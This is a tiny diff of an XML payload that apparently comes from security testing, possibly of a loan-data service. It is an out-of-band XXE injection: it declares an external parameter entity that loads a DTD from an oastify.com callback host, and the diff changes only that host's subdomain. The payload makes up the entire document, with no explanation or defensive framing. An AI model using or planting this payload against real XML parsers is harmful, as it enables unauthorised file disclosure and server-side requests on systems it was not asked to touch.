@@ -1,4 +1,4 @@
 <!DOCTYPE foo [
 <!ELEMENT foo ANY>
-<!ENTITY % xxe SYSTEM "http://9kukb1axk19orze72w1pfocl2c83wtki.oastify.com/xxe.dtd"> %xxe; ]>
+<!ENTITY % xxe SYSTEM "http://3aee1v0ravziht41sqrj5i2fs6yxmoad.oastify.com/xxe.dtd"> %xxe; ]>
 <foo></foo></@html_entities></loanDataXml>
